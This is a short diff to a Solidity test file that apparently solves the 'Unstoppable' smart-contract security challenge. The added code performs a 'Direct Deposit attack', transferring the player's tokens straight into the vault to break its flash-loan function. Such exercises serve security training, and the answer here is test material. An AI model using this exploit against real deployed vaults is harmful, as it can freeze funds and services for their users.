@@ -91,7 +91,8 @@ contract UnstoppableChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_unstoppable() public checkSolvedByPlayer {
-        
+        // Note: Direct Deposit attack
+        token.transfer(address(vault), INITIAL_PLAYER_TOKEN_BALANCE);
     }
 
     /**
